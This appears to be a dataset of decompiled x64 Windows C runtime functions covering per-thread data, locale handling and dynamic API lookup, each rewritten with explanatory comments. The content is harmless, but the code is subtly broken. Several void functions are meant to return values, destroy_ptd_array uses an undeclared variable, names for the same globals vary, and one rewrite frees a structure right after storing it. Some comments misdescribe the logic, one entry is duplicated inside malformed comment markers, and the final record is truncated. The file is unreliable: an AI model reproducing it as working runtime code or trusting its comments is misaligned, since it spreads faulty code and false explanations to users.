{"Function Name": "construct_ptd_array", "Address": "1400151f8", "Source Code": "\nvoid __cdecl construct_ptd_array(__acrt_ptd *input_ptd)\n{\n    undefined1 temp_storage[8]; // Local array for temporary storage\n    int init_values_5[2] = {5, 5}; // Local array initialized with values 5, 5\n    int init_values_4[2] = {4, 4}; // Local array initialized with values 4, 4\n    __acrt_ptd *ptd_pointer = input_ptd; // Pointer to the input parameter\n    undefined8 *global_data_pointer = &DAT_14003a448; // Pointer to a global data location\n\n    *(undefined4 *)(input_ptd + 0x28) = 1; // Set a specific field in the structure to 1\n    *(undefined **)input_ptd = &DAT_140028f90; // Assign a global pointer to the first field of the structure\n    *(undefined4 *)(input_ptd + 0x3a8) = 1; // Set another specific field in the structure to 1\n    *(undefined **)(input_ptd + 0x88) = &DAT_1400387d0; // Assign another global pointer to a field in the structure\n    *(undefined2 *)(input_ptd + 0xbc) = 0x43; // Set a specific field in the structure to 0x43\n    *(undefined2 *)(input_ptd + 0x1c2) = 0x43; // Set another specific field in the structure to 0x43\n    *(undefined8 *)(input_ptd + 0x3a0) = 0; // Initialize a specific field in the structure to 0\n\n    operator()<>(temp_storage, init_values_5, &ptd_pointer, init_values_5); // Call operator with local_res10 and local_res18\n    operator()<>(temp_storage, init_values_4 + 1, &ptd_pointer, init_values_4); // Call operator with local_res10 and local_38 (offset by 1)\n}\n"}
{"Function Name": "FUN_1400152c8", "Address": "1400152c8", "Source Code": "\nvoid FUN_1400152c8(__acrt_ptd *thread_local_storage)\n{\n    // Check if the parameter is not NULL\n    if (thread_local_storage) {\n        // Destroy the thread-local storage array associated with param_1\n        destroy_ptd_array(thread_local_storage);\n        // Free the memory allocated for param_1\n        _free_base(thread_local_storage);\n    }\n}\n"}
{"Function Name": "destroy_ptd_array", "Address": "1400152e8", "Source Code": "\nvoid __cdecl destroy_ptd_array(__acrt_ptd *input_ptd)\n{\n    __acrt_ptd *local_ptd = input_ptd; // Store the input parameter in a local variable\n    // Check if the first element of the structure pointed by param_1 is not equal to a specific value\n    if (*(undefined **)input_ptd != &DAT_140028f90) {\n        _free_base(*(undefined **)input_ptd); // Free the memory pointed by the first element if the condition is met\n    }\n    // Free various memory locations associated with the structure\n    _free_base(*(LPVOID *)(local_ptd + 0x70)); // Free memory at offset 0x70\n    _free_base(*(LPVOID *)(local_ptd + 0x58)); // Free memory at offset 0x58\n    _free_base(*(LPVOID *)(local_ptd + 0x60)); // Free memory at offset 0x60\n    _free_base(*(LPVOID *)(local_ptd + 0x68)); // Free memory at offset 0x68\n    _free_base(*(LPVOID *)(local_ptd + 0x48)); // Free memory at offset 0x48\n    _free_base(*(LPVOID *)(local_ptd + 0x50)); // Free memory at offset 0x50\n    _free_base(*(LPVOID *)(local_ptd + 0x78)); // Free memory at offset 0x78\n    _free_base(*(LPVOID *)(local_ptd + 0x80)); // Free memory at offset 0x80\n    _free_base(*(LPVOID *)(local_ptd + 0x3c0)); // Free memory at offset 0x3c0\n    \n    undefined1 temp_storage[8]; // Declare an array for temporary storage\n    int init_values[2] = {5, 5}; // Initialize an array with specific values\n    int another_init_values[2] = {4, 4}; // Initialize another array with specific values\n    __acrt_ptd **pointer_to_local_ptd = &local_ptd; // Create a pointer to the local variable local_20\n    \n    // Call operator() with the first set of parameters\n    operator()<>(temp_storage, local_res20, &pointer_to_local_ptd, init_values);\n    // Call operator() with the second set of parameters\n    operator()<>(temp_storage, another_init_values + 1, &pointer_to_local_ptd, another_init_values);\n    \n    return; // Exit the function\n}\n"}
{"Function Name": "replace_current_thread_locale_nolock", "Address": "1400153e0", "Source Code": "\nvoid __cdecl replace_current_thread_locale_nolock(__acrt_ptd *thread_locale_data, __crt_locale_data *new_locale_data)\n{\n    // Check if the current thread's locale reference is not null\n    if (*(longlong *)(thread_locale_data + 0x90) != 0) {\n        // Release the reference to the current locale\n        __acrt_release_locale_ref(*(longlong *)(thread_locale_data + 0x90));\n        \n        // Get the pointer to the current locale data\n        undefined **current_locale_pointer = *(undefined ***)(thread_locale_data + 0x90);\n        \n        // Check if the current locale is not a specific value and if its reference count is zero\n        if (((current_locale_pointer != DAT_14003a448) && (current_locale_pointer != &PTR_DAT_1400381b0)) && (*(int *)(current_locale_pointer + 2) == 0)) {\n            // Free the locale data if the reference count is zero\n            __acrt_free_locale((longlong)current_locale_pointer);\n        }\n    }\n    \n    // Set the current thread's locale to the new locale provided\n    *(__crt_locale_data **)(thread_locale_data + 0x90) = new_locale_data;\n    \n    // If the new locale is not null, increment its reference count\n    if (new_locale_data != (__crt_locale_data *)0x0) {\n        __acrt_add_locale_ref((longlong)new_locale_data);\n    }\n}\n"}
{"Function Name": "__acrt_getptd", "Address": "140015448", "Source Code": "\nvoid __acrt_getptd(void)\n{\n    // Store the current thread's last error code\n    DWORD lastErrorCode = GetLastError();\n    \n    // Retrieve the pointer to the thread-local data structure\n    __acrt_ptd *threadLocalData = (__acrt_ptd *)__acrt_FlsGetValue(threadLocalStorageId);\n    \n    // Check if the thread-local storage identifier is invalid or if the pointer is null\n    if ((threadLocalStorageId == 0xffffffff) || (threadLocalData == (__acrt_ptd *)0x0)) {\n        // Attempt to set the thread-local storage value to an invalid pointer\n        if (__acrt_FlsSetValue(threadLocalStorageId, (LPVOID)0xffffffffffffffff) != 0) {\n            // Allocate memory for the thread-local data structure\n            threadLocalData = (__acrt_ptd *)_calloc_base(1, 0x3c8);\n            // Check if memory allocation failed\n            if (threadLocalData == (__acrt_ptd *)0x0) {\n                // Reset the thread-local storage value to null if allocation failed\n                __acrt_FlsSetValue(threadLocalStorageId, (LPVOID)0x0);\n            } else {\n                // Attempt to set the thread-local storage value to the newly allocated pointer\n                if (__acrt_FlsSetValue(threadLocalStorageId, threadLocalData) != 0) {\n                    // Initialize the thread-local data structure\n                    construct_ptd_array(threadLocalData);\n                    // Free the null pointer (no-op)\n                    _free_base((LPVOID)0x0);\n                } else {\n                    // Reset the thread-local storage value to null if setting failed\n                    __acrt_FlsSetValue(threadLocalStorageId, (LPVOID)0x0);\n                }\n                // Free the allocated memory for the thread-local data structure\n                _free_base(threadLocalData);\n            }\n        }\n    } else if (threadLocalData == (__acrt_ptd *)0xffffffffffffffff) {\n        // If the pointer is set to the invalid value, reset it to null\n        threadLocalData = (__acrt_ptd *)0x0;\n    }\n\n    // Restore the previous last error code\n    SetLastError(lastErrorCode);\n    \n    // Check if the pointer is valid; if not, terminate the program\n    if ((-(ulonglong)(threadLocalData != (__acrt_ptd *)0x0) & (ulonglong)threadLocalData) == 0) {\n        abort();\n    }\n}\n"}
{"Function Name": "__acrt_getptd_head", "Address": "14001551c", "Source Code": "\n__acrt_ptd * __acrt_getptd_head(void) // Function to get the head of the thread-local storage\n{\n    __acrt_ptd *threadDataPointer; // Pointer to a thread-local data structure\n\n    // Check if the thread-local storage index is invalid or if the value at that index is NULL\n    if ((tlsIndex == 0xffffffff) || (threadDataPointer = (__acrt_ptd *)__acrt_FlsGetValue(tlsIndex), threadDataPointer == (__acrt_ptd *)0x0)) {\n        \n        // Attempt to set the value at the thread-local storage index to an invalid pointer\n        if (__acrt_FlsSetValue(tlsIndex, (LPVOID)0xffffffffffffffff) == 0) \n            goto LAB_1400155bd; // If setting fails, abort\n\n        // Allocate memory for the thread-local data structure\n        threadDataPointer = (__acrt_ptd *)allocateMemory(1, 0x3c8);\n        \n        // Check if memory allocation failed\n        if (threadDataPointer == (__acrt_ptd *)0x0) {\n            __acrt_FlsSetValue(tlsIndex, (LPVOID)0x0); // Reset the thread-local storage index\n            threadDataPointer = (__acrt_ptd *)0x0; // Set pointer to NULL\n        } else {\n            // If setting the value in thread-local storage is successful\n            if (__acrt_FlsSetValue(tlsIndex, threadDataPointer) != 0) {\n                initializeThreadLocalData(threadDataPointer); // Initialize the thread-local data structure\n                freeMemory((LPVOID)0x0); // Free any previously allocated memory\n                goto LAB_1400155af; // Proceed to return the pointer\n            }\n            __acrt_FlsSetValue(tlsIndex, (LPVOID)0x0); // Reset if setting failed\n        }\n        freeMemory(threadDataPointer); // Free the allocated memory if it was not set in thread-local storage\n    } else {\n        // If the pointer is set to the invalid value, go to abort\n        if (threadDataPointer == (__acrt_ptd *)0xffffffffffffffff) \n            goto LAB_1400155bd;\n    }\nLAB_1400155af:\n    // Return the pointer if it's valid\n    if (threadDataPointer != (__acrt_ptd *)0x0) {\n        return threadDataPointer;\n    }\nLAB_1400155bd:\n    terminateProgram(); // Abort the program if no valid pointer is available\n}\n"}
{"Function Name": "__acrt_getptd_noexit", "Address": "1400155c4", "Source Code": "\nulonglong __acrt_getptd_noexit(void)\n{\n    // Store the current thread's last error code\n    DWORD lastErrorCode = GetLastError();\n    \n    // Retrieve the pointer to the thread-local data (PTD) using the thread-local storage index\n    __acrt_ptd *ptdPointer = (__acrt_ptd *)__acrt_FlsGetValue(threadLocalStorageIndex);\n    \n    // Check if the thread-local storage index is invalid or if the PTD pointer is null\n    if ((threadLocalStorageIndex == 0xffffffff) || (ptdPointer == (__acrt_ptd *)0x0)) {\n        // Attempt to set the thread-local storage value to an invalid pointer\n        if (__acrt_FlsSetValue(threadLocalStorageIndex, (LPVOID)0xffffffffffffffff) != 0) {\n            // Allocate memory for the PTD structure\n            ptdPointer = (__acrt_ptd *)_calloc_base(1, 0x3c8);\n            // Check if memory allocation failed\n            if (ptdPointer == (__acrt_ptd *)0x0) {\n                // Reset the thread-local storage value to null if allocation fails\n                __acrt_FlsSetValue(threadLocalStorageIndex, (LPVOID)0x0);\n            } else {\n                // If the thread-local storage value was successfully set to the new PTD\n                if (__acrt_FlsSetValue(threadLocalStorageIndex, ptdPointer) != 0) {\n                    // Construct the PTD array for the new PTD\n                    construct_ptd_array(ptdPointer);\n                    // Free the null pointer (no operation)\n                    _free_base((LPVOID)0x0);\n                } else {\n                    // Reset the thread-local storage value to null if setting fails\n                    __acrt_FlsSetValue(threadLocalStorageIndex, (LPVOID)0x0);\n                }\n                // Free the allocated PTD structure\n                _free_base(ptdPointer);\n            }\n        }\n    } else if (ptdPointer == (__acrt_ptd *)0xffffffffffffffff) {\n        // If the PTD pointer is set to the invalid value, reset it to null\n        ptdPointer = (__acrt_ptd *)0x0;\n    }\n\n    // Restore the previous thread's last error code\n    SetLastError(lastErrorCode);\n    \n    // Return the PTD pointer as a ulonglong, or 0 if it is null\n    return -(ulonglong)(ptdPointer != (__acrt_ptd *)0x0) & (ulonglong)ptdPointer;\n}\n"}
{"Function Name": "__acrt_initialize_ptd", "Address": "140015690", "Source Code": "\nulonglong __acrt_initialize_ptd(void) // Function to initialize the thread-local storage\n{\n    ulonglong flsIndex = __acrt_FlsAlloc(FUN_1400152c8); // Allocate a fiber-local storage (FLS) index\n    globalFlsIndex = (int)flsIndex; // Store the allocated index in a global variable\n    if (globalFlsIndex != -1) { // Check if the allocation was successful\n        flsIndex = __acrt_getptd_noexit(); // Retrieve the pointer to the thread data\n        if (flsIndex != 0) { // Check if the thread data pointer is valid\n            return CONCAT71((int7)(flsIndex >> 8), 1); // Return the thread data pointer with a flag\n        }\n        __acrt_uninitialize_ptd(); // Uninitialize the thread-local storage if pointer is invalid\n    }\n    return flsIndex & 0xffffffffffffff00; // Return the FLS index masked to 56 bits\n}\n"}
{"Function Name": "__acrt_uninitialize_ptd", "Address": "1400156cc", "Source Code": "\nundefined1 __acrt_uninitialize_ptd(void)\n{\n    // Check if the global variable DAT_1400381a0 is not equal to -1\n    if (threadLocalStoragePointer != -1) {\n        // Free the thread-local storage associated with DAT_1400381a0\n        __acrt_FlsFree(threadLocalStoragePointer);\n        // Set DAT_1400381a0 to -1 to indicate it has been uninitialized\n        threadLocalStoragePointer = -1;\n    }\n    // Return 1 to indicate successful uninitialization\n    return 1;\n}\n"}
{"Function Name": "_free_base", "Address": "1400156f0", "Source Code": "\nvoid _free_base(LPVOID memory_pointer)\n{\n    // Check if the pointer is not null\n    if (memory_pointer != (LPVOID)0x0 && \n        // Attempt to free the memory and check if it fails\n        !HeapFree(heap_handle, 0, memory_pointer)) {\n        \n        // Set the DOS error number based on the last OS error\n        *dos_error() = convert_os_error(retrieve_last_error());\n    }\n}\n"}
{"Function Name": "operator()<>", "Address": "140015758", "Source Code": "\\*\nBOOL operator()<>(undefined8 locale_param, int *lock_param, undefined8 *data_param, int *unlock_param)\n{\n    byte bit_shift_amount; // Variable to hold the bit shift amount\n    BOOL locale_result; // Variable to store the result of the locale enumeration\n\n    __acrt_lock(*lock_param); // Acquire a lock using the value pointed to by param_2\n\n    // Calculate the bit shift amount based on the value of DAT_140038080\n    bit_shift_amount = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f;\n\n    // Perform a bitwise operation on the value pointed to by param_3,\n    // shifting it left and right, and XOR it with DAT_140038080\n    _DAT_14003a440 = (*(ulonglong *)*data_param >> bit_shift_amount | *(ulonglong *)*data_param << 0x40 - bit_shift_amount) ^ DAT_140038080;\n\n    // Enumerate system locales and store the result in BVar2\n    locale_result = EnumSystemLocalesW((LOCALE_ENUMPROCW)&LAB_140015730, 1);\n\n    // Restore the original value of _DAT_14003a440\n    _DAT_14003a440 = DAT_140038080;\n\n    __acrt_unlock(*unlock_param); // Release the lock using the value pointed to by param_4\n\n    return locale_result; // Return the result of the locale enumeration\n}\n*\\ \n \n\nBOOL operator()<>(undefined8 locale_param, int *lock_param, undefined8 *data_param, int *unlock_param)\n{\n    byte bit_shift_amount;\n    BOOL locale_result;\n    __acrt_lock(*lock_param);\n    bit_shift_amount = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f;\n    _DAT_14003a440 = (*(ulonglong *)*data_param >> bit_shift_amount | *(ulonglong *)*data_param << 0x40 - bit_shift_amount) ^ DAT_140038080;\n    locale_result = EnumSystemLocalesW((LOCALE_ENUMPROCW)&LAB_140015730, 1);\n    _DAT_14003a440 = DAT_140038080;\n    __acrt_unlock(*unlock_param);\n    return locale_result;\n}\n"}
{"Function Name": "try_get_function", "Address": "1400157d4", "Source Code": "\nvoid * __cdecl\ntry_get_function(function_id param_1, char *param_2, module_id *param_3, module_id *param_4)\n{\n    module_id mVar2; // Variable to hold module ID\n    DWORD DVar4; // Variable to hold error code\n    HMODULE hLibModule; // Handle for the loaded library module\n    FARPROC pFVar6; // Pointer to the function address\n    void *pvVar7; // Pointer to the retrieved function\n    byte bVar3 = (byte)DAT_140038080 & 0x3f; // Mask to extract bits for rotation\n    \n    // Calculate the function pointer using bitwise operations and a lookup table\n    pvVar7 = (void *)((DAT_140038080 ^ (&DAT_14003a330)[param_1]) >> bVar3 |\n                     (DAT_140038080 ^ (&DAT_14003a330)[param_1]) << (0x40 - bVar3));\n    \n    // Check if the function pointer is valid\n    if (pvVar7 != (void *)0xffffffffffffffff) {\n        if (pvVar7 != (void *)0x0) { // If the function pointer is not null, return it\n            return pvVar7;\n        }\n        \n        // If the range of modules is valid, iterate through them\n        if (param_3 != param_4) {\n            do {\n                mVar2 = *param_3; // Get the current module ID\n                hLibModule = (HMODULE)(&DAT_14003a290)[mVar2]; // Retrieve the library module handle\n                \n                // If the module is not loaded, attempt to load it\n                if (hLibModule == (HMODULE)0x0) {\n                    wchar_t *lpLibFileName = (wchar_t *)(&PTR_u_api_ms_win_core_datetime_l1_1_1_140029370)[mVar2];\n                    hLibModule = LoadLibraryExW(lpLibFileName, (HANDLE)0x0, 0x800); // Load the library\n                    \n                    // If loading fails, check for specific error conditions\n                    if (hLibModule == (HMODULE)0x0) {\n                        DVar4 = GetLastError(); // Get the last error code\n                        // If the error is specific and the filename does not match certain prefixes, try loading again\n                        if (((DVar4 == 0x57) && (wcsncmp(lpLibFileName, L\"api-ms-\", 7) != 0) &&\n                             (wcsncmp(lpLibFileName, L\"ext-ms-\", 7) != 0))) {\n                            hLibModule = LoadLibraryExW(lpLibFileName, (HANDLE)0x0, 0); // Attempt to load without flags\n                        }\n                    }\n                }\n                \n                // If the library was successfully loaded\n                if (hLibModule != (HMODULE)0x0) {\n                    LOCK(); // Acquire lock for thread safety\n                    (&DAT_14003a290)[mVar2] = hLibModule; // Store the loaded module handle\n                    UNLOCK(); // Release lock\n                    goto LAB_140015906; // Jump to the function retrieval section\n                }\n                \n                // If loading failed, mark the module as unavailable\n                LOCK(); // Acquire lock for thread safety\n                (&DAT_14003a290)[mVar2] = 0xffffffffffffffff; // Indicate failure to load\n                UNLOCK(); // Release lock\n                \n                param_3++; // Move to the next module in the list\n            } while (param_3 != param_4); // Continue until all modules are checked\n        }\n        \n        hLibModule = (HMODULE)0x0; // Reset the module handle\n    LAB_140015906:\n        // If the library is loaded, attempt to retrieve the function address\n        if ((hLibModule != (HMODULE)0x0) &&\n            (pFVar6 = GetProcAddress(hLibModule, param_2), pFVar6 != (FARPROC)0x0)) {\n            bVar3 = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f; // Calculate rotation for function address\n            LOCK(); // Acquire lock for thread safety\n            (&DAT_14003a330)[param_1] = ((ulonglong)pFVar6 >> bVar3 | (longlong)pFVar6 << (0x40 - bVar3)) ^ DAT_140038080; // Store the function address\n            UNLOCK(); // Release lock\n            return pFVar6; // Return the function address\n        }\n        \n        // If the function address could not be retrieved, mark it as unavailable\n        bVar3 = 0x40 - ((byte)DAT_140038080 & 0x3f) & 0x3f; // Calculate rotation for failure indication\n        LOCK(); // Acquire lock for thread safety\n        (&DAT_14003a330)[param_1] = (0xffffffffffffffffU >> bVar3 | -1L << (0x40 - bVar3)) ^ DAT_140038080; // Indicate failure to retrieve function\n        UNLOCK(); // Release lock\n    }\n    \n    return (void *)0x0; // Return null if no function was found\n}\n"}
{"Function Name": "__acrt_AppPolicyGetProcessTerminationMethodInternal", "Address": "1400159ac", "Source Code": "\nundefined8 __acrt_AppPolicyGetProcessTerminationMethodInternal(undefined8 process_id)\n{\n    // Attempt to retrieve the function pointer for AppPolicyGetProcessTerminationMethod\n    code *termination_method_pointer = (code *)try_get_function(0x1c, \"AppPolicyGetProcessTerminationMethod\", (module_id *)&module_data, (module_id *)\"AppPolicyGetProcessTerminationMethod\");\n    \n    // Check if the function pointer retrieval was unsuccessful\n    if (termination_method_pointer == (code *)0x0) {\n        // Return an error code indicating the function could not be found\n        return 0xc0000225;\n    }\n    \n    // Call the retrieved function with specific parameters and return its result\n    return (*termination_method_pointer)(0xfffffffffffffffa, process_id);\n}\n"}
{"Function Name": "__acrt_EnumSystemLocalesEx", "Address": "1400159fc", "Source Code": "\nvoid __acrt_EnumSystemLocalesEx(undefined8 localeParam1, undefined4 localeParam2, undefined8 localeParam3, undefined8 localeParam4)\n{\n    void *functionAddress; // Pointer to hold the address of the function if found\n    undefined1 operatorData[4]; // Local array to store data for the operator function\n    int integerValues[2]; // Local array to store integer values\n    undefined8 *pointerArray[1]; // Local array to hold pointers to undefined8 type\n\n    // Attempt to retrieve the address of the EnumSystemLocalesEx function\n    functionAddress = try_get_function(2, \"EnumSystemLocalesEx\", (module_id *)&DAT_140029948, (module_id *)\"EnumSystemLocalesEx\");\n    \n    // Check if the function address was successfully retrieved\n    if (functionAddress == (void *)0x0) {\n        pointerArray[0] = &localeParam1; // Store the address of param_1 in local_18\n        integerValues[0] = 4; // Set the first element of local_24 to 4\n        // Call the operator function with local arrays as arguments\n        operator()<>(operatorData, integerValues, pointerArray, integerValues);\n    } else {\n        // If the function was found, call it with the provided parameters\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(localeParam1, localeParam2, localeParam3, localeParam4);\n    }\n    return; // Exit the function\n}\n"}
{"Function Name": "__acrt_FlsAlloc", "Address": "140015a94", "Source Code": "\nvoid __acrt_FlsAlloc(undefined8 inputParameter)\n{\n    // Attempt to retrieve the function pointer for FlsAlloc\n    code *flsAllocFunctionPointer = (code *)try_get_function(3, \"FlsAlloc\", (module_id *)&DAT_140029968, (module_id *)\"FlsAlloc\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (flsAllocFunctionPointer == (code *)0x0) {\n        // If not, call TlsAlloc as a fallback\n        TlsAlloc();\n    } else {\n        // If retrieved, call the FlsAlloc function with the provided parameter\n        (*flsAllocFunctionPointer)(inputParameter);\n    }\n}\n"}
{"Function Name": "__acrt_FlsFree", "Address": "140015adc", "Source Code": "\nvoid __acrt_FlsFree(undefined4 thread_local_storage)\n{\n    // Attempt to retrieve the function pointer for FlsFree using try_get_function\n    code *fls_free_function_pointer = (code *)try_get_function(4, \"FlsFree\", (module_id *)&DAT_140029980, (module_id *)\"FlsFree\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (fls_free_function_pointer == (code *)0x0) {\n        // If not, call TlsFree with the provided parameter\n        TlsFree(thread_local_storage);\n    } else {\n        // If the function pointer is valid, invoke the function\n        (*fls_free_function_pointer)();\n    }\n}\n"}
{"Function Name": "__acrt_FlsGetValue", "Address": "140015b24", "Source Code": "\nvoid __acrt_FlsGetValue(undefined4 function_param)\n{\n    // Attempt to retrieve the function pointer for FlsGetValue\n    code *function_pointer = (code *)try_get_function(5, \"FlsGetValue\", (module_id *)&module_data, (module_id *)\"FlsGetValue\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (code *)0x0) {\n        // If not, call TlsGetValue with the provided parameter\n        TlsGetValue(function_param);\n    } else {\n        // If the function pointer is valid, call the retrieved function\n        (*function_pointer)();\n    }\n}\n"}
{"Function Name": "__acrt_FlsSetValue", "Address": "140015b6c", "Source Code": "\nvoid __acrt_FlsSetValue(DWORD thread_id, LPVOID value)\n{\n    // Attempt to retrieve the function pointer for FlsSetValue\n    void *function_pointer = try_get_function(6, \"FlsSetValue\", (module_id *)&DAT_1400299a8, (module_id *)\"FlsSetValue\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (void *)0x0) {\n        // If not, call TlsSetValue with the provided parameters\n        TlsSetValue(thread_id, value);\n    } else {\n        // If the function pointer is valid, call the function using the retrieved pointer\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n    }\n}\n"}
{"Function Name": "__acrt_GetLocaleInfoEx", "Address": "140015bc0", "Source Code": "\nvoid __acrt_GetLocaleInfoEx(wchar_t *locale_name, LCTYPE locale_type, LPWSTR locale_info, int buffer_size)\n{\n    LCID locale_id; // Declare a variable to hold the locale identifier\n    void *function_address = try_get_function(0xb, \"GetLocaleInfoEx\", (module_id *)&DAT_1400299d8, (module_id *)\"GetLocaleInfoEx\"); // Attempt to retrieve the address of the GetLocaleInfoEx function\n\n    if (function_address == (void *)0x0) { // Check if the function address was not found\n        locale_id = __acrt_LocaleNameToLCID(locale_name, 0); // Convert the locale name to a locale identifier\n        GetLocaleInfoW(locale_id, locale_type, locale_info, buffer_size); // Retrieve locale information using the locale identifier\n    } else {\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(locale_name, locale_type, locale_info, buffer_size); // Call the retrieved function pointer with the provided parameters\n    }\n}\n"}
{"Function Name": "__acrt_GetUserDefaultLocaleName", "Address": "140015c44", "Source Code": "\nvoid __acrt_GetUserDefaultLocaleName(wchar_t *locale_name_buffer, int locale_name_length)\n{\n    // Attempt to retrieve the address of the GetUserDefaultLocaleName function\n    void *function_address = try_get_function(0xf, \"GetUserDefaultLocaleName\", (module_id *)&DAT_140029a08, (module_id *)\"GetUserDefaultLocaleName\");\n    \n    // Check if the function address was successfully retrieved\n    if (function_address == (void *)0x0) {\n        // If not, convert the default LCID to a locale name and store it in param_1\n        __acrt_LCIDToLocaleName(GetUserDefaultLCID(), locale_name_buffer, locale_name_length);\n    } else {\n        // If the function address is valid, call the function with the provided parameters\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(locale_name_buffer, locale_name_length);\n    }\n}\n"}
{"Function Name": "__acrt_InitializeCriticalSectionEx", "Address": "140015ca8", "Source Code": "\nvoid __acrt_InitializeCriticalSectionEx(LPCRITICAL_SECTION critical_section, DWORD spin_count, undefined4 undefined_param)\n{\n    // Attempt to retrieve the function pointer for InitializeCriticalSectionEx\n    void *function_pointer = try_get_function(0x12, \"InitializeCriticalSectionEx\", (module_id *)&DAT_140029a30, (module_id *)\"InitializeCriticalSectionEx\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (void *)0x0) {\n        // If not, call InitializeCriticalSectionAndSpinCount with the provided parameters\n        InitializeCriticalSectionAndSpinCount(critical_section, spin_count);\n    } else {\n        // If the function pointer is valid, call the retrieved function with the parameters\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)(critical_section, spin_count, undefined_param);\n    }\n}\n"}
{"Function Name": "__acrt_IsValidLocaleName", "Address": "140015d0c", "Source Code": "\nvoid __acrt_IsValidLocaleName(wchar_t *locale_name) // Function to validate a locale name\n{\n    // Attempt to retrieve the function pointer for IsValidLocaleName\n    code *function_pointer = (code *)try_get_function(0x13, \"IsValidLocaleName\", (module_id *)&module_data, (module_id *)\"IsValidLocaleName\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (code *)0x0) {\n        // If not, convert the locale name to LCID and validate it\n        validate_locale(locale_name_to_lcid(locale_name, 0), 1);\n        return; // Exit the function after validation\n    }\n    \n    // If the function pointer is valid, call the retrieved function\n    (*function_pointer)();\n}\n"}
{"Function Name": "__acrt_LCIDToLocaleName", "Address": "140015d64", "Source Code": "\nvoid __acrt_LCIDToLocaleName(uint locale_id, wchar_t *locale_name, int flags)\n{\n    // Attempt to retrieve the function pointer for \"LCIDToLocaleName\"\n    void *function_pointer = try_get_function(0x15, \"LCIDToLocaleName\", (module_id *)&DAT_140029a90, (module_id *)\"LCIDToLocaleName\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (void *)0x0) {\n        // If not, call the downlevel implementation of LCIDToLocaleName\n        __acrt_DownlevelLCIDToLocaleName(locale_id, locale_name, flags);\n    } else {\n        // If the function pointer is valid, call the function using the retrieved pointer\n        (*(code *)PTR__guard_dispatch_icall_1400213e8)();\n    }\n}\n"}
{"Function Name": "__acrt_LCMapStringEx", "Address": "140015dd4", "Source Code": "\nvoid __acrt_LCMapStringEx\n(wchar_t *param_1,DWORD param_2,LPCWSTR param_3,int param_4,LPWSTR param_5,\nint param_6,undefined8 param_7,undefined8 param_8,undefined8 param_9)\n{\n    LCID Locale; // Declare a variable to hold the locale identifier\n    void *pvVar1 = try_get_function(0x14,\"LCMapStringEx\",(module_id *)&DAT_140029a78,\n    (module_id *)\"LCMapStringEx\"); // Attempt to retrieve the LCMapStringEx function dynamically\n    \n    if (pvVar1 == (void *)0x0) { // Check if the function was not found\n        Locale = __acrt_LocaleNameToLCID(param_1,0); // Convert locale name to LCID\n        LCMapStringW(Locale,param_2,param_3,param_4,param_5,param_6); // Call LCMapStringW with the obtained LCID\n    } else { // If the function was found\n        (*(code *)PTR__guard_dispatch_icall_1400213e8) // Dispatch the call to the retrieved function\n        (param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);\n    }\n}\n"}
{"Function Name": "__acrt_LocaleNameToLCID", "Address": "140015eb0", "Source Code": "\nvoid __acrt_LocaleNameToLCID(wchar_t *locale_name, undefined4 locale_id)\n{\n    // Attempt to retrieve the function pointer for LocaleNameToLCID\n    void *function_pointer = try_get_function(0x16, \"LocaleNameToLCID\", (module_id *)&module_base, (module_id *)\"LocaleNameToLCID\");\n    \n    // Check if the function pointer was successfully retrieved\n    if (function_pointer == (void *)0x0) {\n        // If not, call the downlevel implementation of LocaleNameToLCID\n        __acrt_DownlevelLocaleNameToLCID(locale_name);\n    } else {\n        // If the function pointer is valid, call the function with the provided parameters\n        (*(code *)guard_dispatch_function)(locale_name, locale_id);\n    }\n}\n"}
{"Function Name": "__acrt_can_use_vista_locale_apis", "Address": "140015f00", "Source Code": "\nbool canUseVistaLocaleAPIs(void)\n{\n    // Attempt to retrieve the function pointer for \"CompareStringEx\"\n    // with a specific module ID and check if it is not null.\n    return retrieveFunctionPointer(1, \"CompareStringEx\", (module_id *)&moduleID, (module_id *)\"CompareStringEx\") != (void *)0x0;\n}\n"}
{"Function Name": "__acrt_eagerly_load_locale_apis", "Address": "140015f30", "Source Code": "\nvoid __acrt_eagerly_load_locale_apis(void)\n{\n    // Attempt to load the \"AreFileApisANSI\" function and store its address\n    try_get_function(0, \"AreFileApisANSI\", (module_id *)&are_file_apis_ansi_address, (module_id *)&are_file_apis_ansi_name);\n    \n    // Attempt to load the \"CompareStringEx\" function and store its address\n    try_get_function(1, \"CompareStringEx\", (module_id *)&compare_string_ex_address, (module_id *)\"CompareStringEx\");\n    \n    // Attempt to load the \"EnumSystemLocalesEx\" function and store its address\n    try_get_function(2, \"EnumSystemLocalesEx\", (module_id *)&enum_system_locales_ex_address, (module_id *)\"EnumSystemLocalesEx\");\n    \n    // Attempt to load the \"GetDateFormatEx\" function and store its address\n    try_get_function(8, \"GetDateFormatEx\", (module_id *)&get_date_format_ex_address, (module_id *)\"GetDateFormatEx\");\n    \n    // Attempt to load the \"GetLocaleInfoEx\" function and store its address\n    try_get_function(0xb, \"GetLocaleInfoEx\", (module_id *)&get_locale_info_ex_address, (module_id *)\"GetLocaleInfoEx\");\n    \n    // Attempt to load the \"GetTimeFormatEx\" function and store its address\n    try_get_function(0xe, \"GetTimeFormatEx\", (module_id *)&get_time_format_ex_address, (module_id *)\"GetTimeFormatEx\");\n    \n    // Attempt to load the \"GetUserDefaultLocaleName\" function and store its address\n    try_get_function(0xf, \"GetUserDefaultLocaleName\", (module_id *)&get_user_default_locale_name_address, (module_id *)\"GetUserDefaultLocaleName\");\n    \n    // Attempt to load the \"IsValidLocaleName\" function and store its address\n    try_get_function(0x13, \"IsValidLocaleName\", (module_id *)&is_valid_locale_name_address, (module_id *)\"IsValidLocaleName\");\n    \n    // Attempt to load the \"LCMapStringEx\" function and store its address\n    try_get_function(0x14, \"LCMapStringEx\", (module_id *)&lc_map_string_ex_address, (module_id 